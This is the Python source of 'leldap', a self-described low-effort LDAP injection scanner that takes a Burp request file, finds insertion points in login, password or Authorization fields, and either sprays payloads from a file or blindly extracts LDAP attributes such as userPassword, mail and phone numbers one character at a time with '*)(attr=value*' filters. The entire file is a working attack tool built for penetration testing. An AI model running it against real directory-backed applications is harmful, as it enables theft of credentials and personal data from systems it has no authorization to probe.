#!/usr/bin/env python3
import requests
import string
from time import sleep
import sys
import base64
import Burpee.burpee
import logging
import traceback
import argparse
from urllib.parse import urlparse, quote_plus, parse_qs
import json
import re
import copy
import random
import urllib3
from sty import fg, Style, RgbFg

# disable TLS warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# custom color definitions
fg.orange = Style(RgbFg(255, 150, 50))

# common
__version__ = 0.1
__author__ = 'Matthias Kesenheimer'

# TODO:
# - Blind injections
# - new module "information dump"
# - Avoid brute-force bans with timer
# - smart trigger

def send(args, url_str, header_json, data_json, proxy, method, form="json"):
  r = None
  if method == "POST":
    if form == "json":
      r = requests.post(url_str, headers=header_json, json=data_json, proxies=proxy, verify=False)
    else:
      r = requests.post(url_str, headers=header_json, data=data_json, proxies=proxy, verify=False)
  elif method == "GET":
      r = requests.get(url_str, headers=header_json, params=data_json, proxies=proxy, verify=False)
  else:
    print(fg.li_red + "[-] Error: method {} not implemented. Try with GET or POST.".format(method) + fg.rs, flush=True)
    exit(-1)

  #sleep(0.5) #Avoid brute-force bans
  return r


def inject(args, data, payload):
  data_t = copy.deepcopy(data)
  for key in data:
    if isinstance(data[key], list):
      for i in range(0, len(data[key])):
        data_t[key][i] = data[key][i].replace(args.insertionTag, payload)
    else:
      data_t[key] = data[key].replace(args.insertionTag, payload)
  return data_t


def brute(args, url_str, header_json, data_json, proxy, method, form="json"):
  """ 
  url_str: string 
  header_json: json
  data_json: json
  """

  with open("payloads.txt", 'r', encoding='utf-8') as infile:
    for line in infile:
      query = "{}".format(line).replace('\n','')
      # if base64 encoded:
      if args.encode == "base64":
        query = base64.b64encode(query.encode("utf-8")).decode("utf-8")
      elif args.encode == "url":
        query = quote_plus(query)
      else:
        # workaround: escaping '"' with '\"'
        query = query.replace("\"", "\\\"")

      logging.debug("payload: {}".format(query))

      url_str_t = url_str.replace(args.insertionTag, query)
      data_json_t = inject(args, data_json, query)
      header_json_t = inject(args, header_json, query)

      # prepare and send the request
      r = send(args, url_str_t, header_json_t, data_json_t, proxy, method, form)
      try:
        clength = int(r.headers['content-length'])
      except:
        clength = 0
      cclength = clength - len(query)
      print("\t\t\t\t\t -> status {}, content-length {:6}, corrected content-length {:6}\r{}".format(r.status_code, clength, cclength, query))

      # TODO: implement smart trigger


def shuffle(string):
  l = list(string)
  random.shuffle(l)
  return ''.join(l)
      

def enum(args, url_str, header_json, data_json, proxy, method, form="json"):
  """ 
  url_str: string 
  header_json: json
  data_json: json
  """

  alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
  attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]

  for attribute in attributes: #Extract all attributes
    value = ""
    finish = False
    while not finish:
      alphabet_ = alphabet
      if args.random == True:
        alphabet_ = shuffle(alphabet)
      for char in alphabet_: # In each possition test each possible printable char
        query = "*)({}={}{}*".format(attribute, value, char)

        # if base64 encoded:
        if args.encode == "base64":
          query = base64.b64encode(query.encode("utf-8")).decode("utf-8")
        elif args.encode == "url":
          query = quote_plus(query)
        else:
          # workaround: escaping " with \"
          query = query.replace("\"", "\\\"")

        logging.debug("payload: {}".format(query))

        url_str_t = url_str.replace(args.insertionTag, query)
        data_json_t = inject(args, data_json, query)
        header_json_t = inject(args, header_json, query)

        # prepare and send the request
        r = send(args, url_str_t, header_json_t, data_json_t, proxy, method, form)
        sys.stdout.write(f"\r{attribute}: {value}{char}")

        # TODO: implement smart trigger
        # first, send the request without modification
        # compare the following responses with the first request.
        if args.trigger in r.text:
          value += str(char)
          break
        elif "Cannot login" in r.text and "NOT_FOUND" in r.text and not ("not valid" in r.text or "Malformed" in r.text):
          value += str(char)
          break

        if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
          finish = True
          print()



def extractKeyword(string):
  keyword = ""
  tags = ["[l,L]ogin", "[u,U]sername", "[u,U]ser", "Authorization", "[p,P]assword", "[p,P]ass", "pwd"]
  keyword = ""
  for t in tags:
    try:
      #print("    Searching string {} for keyword {}".format(string, t))
      keyword = re.search("([^\",^']*" + t + "[^\",^']*)", string).group(1)
      #print("    -> {}".format(keyword))
      if keyword != "":
        user = input("[+] Keyword '{}' found. Continue with this insertion point? [Y/n]: ".format(keyword))
        if user == 'Y' or user == 'y' or user == '':
          break
        else:
          keyword = ""

    except:
      keyword = ""

    logging.debug("Keyword {}".format(keyword))
  
  return keyword



def calculateInsertionPoint(args, url_str, getparams_json, header_json, data_json):
  """ 
  All arguments except url_str in json format
  """

  print("[*] Calculating insertion point.")
  data_str = json.dumps(data_json)
  header_str = json.dumps(header_json)
  getparams_str = json.dumps(getparams_json)
  if args.insertionTag not in url_str and args.insertionTag not in getparams_str and args.insertionTag not in data_str and args.insertionTag not in header_str:
    print("[*] Insertion tag {} not found in request. Searching for special keywords.".format(args.insertionTag))
   
    print("[*] Searching header for possible insertion points.") 
    key = extractKeyword(header_str)
    if key != "":
      print("[*] Inserting injection point into header '{}'".format(key))
      if key == "Authorization":
        header_json[key] = "Bearer " + args.insertionTag
      else:
        header_json[key] = args.insertionTag
    else:
      print("[*] Searching post data for possible insertion points.")
      key = extractKeyword(data_str) 
      if key != "":
        print("[*] Inserting injection point into data parameter '{}'".format(key))
        data_json[key] = args.insertionTag
      else:
        print("[*] Searching get parameter for possible insertion points.")
        key = extractKeyword(getparams_str) 
        if key != "":
          print("[*] Inserting injection point into get parameter '{}'".format(key))
          getparams_json[key] = args.insertionTag
        else:
          print("[*] No injection points inserted.")
          print(fg.orange + "[*] Aborting." + fg.rs, flush = true)
          exit(0)
  return (getparams_json, header_json, data_json)



def main():
  print(fg.white)                                                    
  print("@@@       @@@@@@@@  @@@       @@@@@@@    @@@@@@   @@@@@@@  ") 
  print("@@@       @@@@@@@@  @@@       @@@@@@@@  @@@@@@@@  @@@@@@@@ ") 
  print("@@!       @@!       @@!       @@!  @@@  @@!  @@@  @@!  @@@ ") 
  print("!@!       !@!       !@!       !@!  @!@  !@!  @!@  !@!  @!@ ") 
  print("@!!       @!!!:!    @!!       @!@  !@!  @!@!@!@!  @!@@!@!  ") 
  print("!!!       !!!!!:    !!!       !@!  !!!  !!!@!!!!  !!@!!!   ") 
  print("!!:       !!:       !!:       !!:  !!!  !!:  !!!  !!:      ") 
  print(" :!:      :!:        :!:      :!:  !:!  :!:  !:!  :!:      ") 
  print(" :: ::::   :: ::::   :: ::::   :::: ::  ::   :::   ::      ") 
  print(": :: : :  : :: ::   : :: : :  :: :  :    :   : :   :       ")
  print()
  print("leldap v{} - low effort ldap injection scanner.".format(__version__))
  print("By {}, 2021.".format(__author__))
  print(fg.rs, flush=True)
                                                           

  parser = argparse.ArgumentParser(description="Test a LDAP injections.")
  parser.add_argument('-r', '--req', dest='requestFile', type=str, required=True, help="Request file. For example copied from Burp.")  
  parser.add_argument('-t', '--tag', dest="insertionTag", type=str, default='<>', help="Insertion point. Default *. Marks the spot for LDAP insertion.")
  parser.add_argument('--protocol', dest='protocol', type=str, default='https', help="The protocol to use for connections: https or http. Default https.")
  parser.add_argument('--proxy', dest='proxy', type=str, default='', help="Use a proxy to connect to the target URL. Example: --proxy 127.0.0.1:8080")
  parser.add_argument('--encode', dest='encode', type=str, default='', help="Encode the payload: base64, url")
  parser.add_argument('--module', dest='module', type=str, default='enum', help="The module to use: brute, enum, dump (TODO)")
  parser.add_argument('--random', dest='random', action='store_true', help="Randomize the alphabet for the module 'enum'")
  parser.add_argument('--method', dest='method', type=str, default='', help="Force using a given HTTP method.")
  parser.add_argument('--loglevel', dest='loglevel', default='WARNING', help="DEBUG, INFO, WARNING, ERROR")
  parser.add_argument('--trigger', dest='trigger', type=str, default='', help="String to search for in the response. If found, something interesting happend.")
  args = parser.parse_args()

  logging.basicConfig(level=getattr(logging, args.loglevel))

  print("[*] Parsing Burp request file.")
  header_json, data = Burpee.burpee.parse_request(args.requestFile)
  print("[*] Done.")
  
  # logic if data is not in json format
  try:
    form = "json"
    data_json = json.loads(data)
  except:
    data_t = "placeholder.com/path?" + data
    form = "plain"
    data_json = parse_qs(urlparse(data_t).query)

  # extract get parameters (if any) from url
  method, resource_name = Burpee.burpee.get_method_and_resource(args.requestFile)
  url_parsed = urlparse(resource_name)
  url_str = args.protocol + "://" + header_json["Host"] + url_parsed.path
  getparams_json = parse_qs(url_parsed.query)

  # logging
  logging.info("Extracted headers: {}".format(header_json))
  logging.info("Extracted post data: {}".format(data_json))
  logging.info("Extracted url parameter: {}".format(getparams_json))

  # calculate the ldap injection insertion point
  getparams_json, header_json, data_json = calculateInsertionPoint(args, url_str, getparams_json, header_json, data_json)
  if method == "GET":
    data_json = getparams_json

  # overwrite HTTP method if given
  if args.method != '':
    method = args.method

  # set up the proxy
  if args.proxy != '':
    proxy = { "http" : args.proxy, "https" : args.proxy }
  else:
    proxy = {}
  logging.debug("Using proxy {}".format(proxy))

  # choose module
  if args.module == 'enum':
    enum(args, url_str, header_json, data_json, proxy, method, form)

  elif args.module == 'brute':
    brute(args, url_str, header_json, data_json, proxy, method, form)

if __name__ == '__main__':
  try:
    main()
  except (KeyboardInterrupt):
    logging.info('Exiting.')
  except Exception as e:
    logging.error("Exiting {}".format(e))
    logging.debug(traceback.format_exc())

